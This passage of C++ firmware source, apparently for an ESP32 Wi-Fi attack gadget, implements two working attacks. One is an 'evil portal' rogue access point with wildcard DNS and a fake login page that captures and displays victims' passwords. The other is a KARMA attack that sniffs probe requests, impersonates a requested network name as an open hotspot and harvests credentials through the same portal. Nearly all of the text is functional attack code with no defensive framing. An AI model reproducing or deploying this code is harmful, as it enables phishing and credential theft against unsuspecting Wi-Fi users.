static void portalRoot()    { g_webServer->send_P(200, "text/html", PORTAL_PAGE); }
static void portalNotFound(){ g_webServer->sendHeader("Location","http://192.168.4.1/",true); g_webServer->send(302,"",""); }
static void portalLogin() {
    if (g_webServer->hasArg("pass")) {
        String c = g_webServer->arg("pass");
        g_capturedCreds.push_back(c);
        logPush("[PORTAL] cred=" + c);
    }
    g_webServer->send_P(200, "text/html", PORTAL_SUCCESS);
}

static void wifi_evil_portal_run() {
    g_capturedCreds.clear();
    WiFi.mode(WIFI_AP);
    WiFi.softAP(g_cfg.apSSID, strlen(g_cfg.apPass) > 0 ? g_cfg.apPass : nullptr, 6, 0, 4);
    delay(150);

    g_dnsServer = new DNSServer();
    g_webServer = new WebServer(EVIL_PORTAL_PORT);
    g_dnsServer->start(DNS_PORT, "*", WiFi.softAPIP());
    g_webServer->on("/",       HTTP_GET,  portalRoot);
    g_webServer->on("/login",  HTTP_POST, portalLogin);
    g_webServer->onNotFound(portalNotFound);
    g_webServer->begin();
    logPush("[PORTAL] started SSID=" + String(g_cfg.apSSID));
    g_xpMitmCnt++;
    xpAdd(XP_PER_WIFI_MITM);

    while (!readButtonLong()) {
        g_dnsServer->processNextRequest();
        g_webServer->handleClient();
        dispClear();
        dispStatusBar("Evil Portal");
        dispText(0, 12, "SSID: " + String(g_cfg.apSSID));
        dispText(0, 22, "IP: " + WiFi.softAPIP().toString());
        dispText(0, 32, "Clients: " + String(WiFi.softAPgetStationNum()));
        dispText(0, 42, "Creds: " + String(g_capturedCreds.size()));
        if (!g_capturedCreds.empty()) {
            String last = g_capturedCreds.back().substring(0, 20);
            dispText(0, 52, ">" + last);
        } else {
            dispText(0, 52, "[LONG] stop");
        }
        dispCommit();
        delay(150);
    }

    g_webServer->stop();
    g_dnsServer->stop();
    delete g_webServer; g_webServer = nullptr;
    delete g_dnsServer; g_dnsServer = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);

    if (!g_capturedCreds.empty()) {
        OptionList show;
        for (auto& c : g_capturedCreds) show.push_back({c, [](){}});
        show.push_back({"Back", [](){}});
        loopOptions(show, "Captured Creds");
    } else {
        dispBanner("No creds captured");
    }
}

static void wifi_karma_run() {
    // Collect probe list first
    g_probeList.clear();
    g_sniffPkts = g_sniffProbe = 0;
    wifiInitForRawTx();
    esp_wifi_set_promiscuous_rx_cb(promiscCallback);

    dispClear();
    dispStatusBar("KARMA: Listening");
    dispText(0, 20, "Collecting probes");
    dispText(0, 30, "for 8 seconds...");
    dispCommit();

    uint32_t start = millis();
    while (millis() - start < 8000) {
        dispClear();
        dispStatusBar("KARMA: Listen");
        dispText(0, 20, "Probes: " + String(g_probeList.size()));
        dispText(0, 30, "Time: " + String((8000 - (millis()-start))/1000) + "s");
        dispCommit();
        delay(200);
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    if (g_probeList.empty()) { dispBanner("No probes found"); WiFi.mode(WIFI_OFF); return; }

    // Build SSID list from probes
    g_karmaSSIDs.clear();
    for (auto& p : g_probeList) {
        if (!p.ssid.isEmpty()) {
            bool dup = false;
            for (auto& s : g_karmaSSIDs) if (s == p.ssid) { dup = true; break; }
            if (!dup) g_karmaSSIDs.push_back(p.ssid);
        }
    }

    if (g_karmaSSIDs.empty()) { dispBanner("No named probes"); WiFi.mode(WIFI_OFF); return; }

    // Show probe SSIDs and let user pick one or auto-first
    OptionList pick;
    for (auto& s : g_karmaSSIDs) pick.push_back({s, [](){}});
    pick.push_back({"Auto (first probe)", [](){}});
    pick.push_back({"Back", [](){}});

    int psel = loopOptions(pick, "KARMA: Pick SSID");
    if (psel < 0 || psel == (int)pick.size()-1) { WiFi.mode(WIFI_OFF); return; }

    String targetSSID = (psel == (int)pick.size()-2) ? g_karmaSSIDs[0] : g_karmaSSIDs[psel];
    logPush("[KARMA] spoofing SSID=" + targetSSID);

    // Start AP with that SSID + Evil Portal
    g_capturedCreds.clear();
    strncpy(g_cfg.apSSID, targetSSID.c_str(), 32);
    memset(g_cfg.apPass, 0, sizeof(g_cfg.apPass));

    WiFi.mode(WIFI_AP);
    WiFi.softAP(g_cfg.apSSID, nullptr, 1, 0, 8);
    delay(150);

    g_dnsServer = new DNSServer();
    g_webServer = new WebServer(EVIL_PORTAL_PORT);
    g_dnsServer->start(DNS_PORT, "*", WiFi.softAPIP());
    g_webServer->on("/",       HTTP_GET,  portalRoot);
    g_webServer->on("/login",  HTTP_POST, portalLogin);
    g_webServer->onNotFound(portalNotFound);
    g_webServer->begin();
    g_xpMitmCnt++;
    xpAdd(XP_PER_WIFI_MITM);

    while (!readButtonLong()) {
        g_dnsServer->processNextRequest();
        g_webServer->handleClient();
        dispClear();
        dispStatusBar("KARMA Active");
        dispText(0, 12, "AP: " + targetSSID);
        dispText(0, 22, "Clients: " + String(WiFi.softAPgetStationNum()));
        dispText(0, 32, "Creds: " + String(g_capturedCreds.size()));
        if (!g_capturedCreds.empty())
            dispText(0, 42, ">" + g_capturedCreds.back().substring(0,20));
        dispText(0, 54, "[LONG] stop");
        dispCommit();
        delay(150);
    }

    g_webServer->stop();
    g_dnsServer->stop();
    delete g_webServer; g_webServer = nullptr;
    delete g_dnsServer; g_dnsServer = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);

    if (!g_capturedCreds.empty()) {
        OptionList show;
        for (auto& c : g_capturedCreds) show.push_back({c, [](){}});
        show.push_back({"Back", [](){}});
        loopOptions(show, "KARMA Creds");
    } else {
        dispBanner("KARMA stopped, no creds");
    }
}

